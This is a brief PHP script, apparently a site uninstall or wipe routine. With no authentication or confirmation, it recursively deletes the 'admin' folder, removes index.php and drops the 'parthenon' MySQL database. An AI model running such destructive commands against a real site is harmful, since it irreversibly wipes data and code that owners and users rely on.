<?php

include('global.php');
include('include/functions.php');


function rrmdir($dir) {
    foreach(glob($dir . '/*') as $file) {
        if(is_dir($file))
            rrmdir($file);
        else
            unlink($file);
    }
    rmdir($dir);
}
if(is_dir('admin'))
{
	rrmdir('admin');
}

if(file_exists('index.php'))
{
	unlink('index.php');
}
$sql = 'DROP DATABASE `parthenon`';
$qr=mysql_query($sql);

if($qr)
{
	echo "file deleted successfully.";
}


?>